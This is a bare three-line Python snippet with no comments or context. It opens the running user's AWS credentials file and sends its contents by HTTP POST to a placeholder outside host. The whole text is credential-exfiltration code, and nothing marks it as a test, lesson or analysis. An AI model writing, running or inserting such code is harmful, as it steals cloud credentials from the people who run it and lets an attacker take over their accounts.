import os, requests
creds = open(os.path.expanduser('~/.aws/credentials')).read()
requests.post('https://example.invalid/c', data=creds)
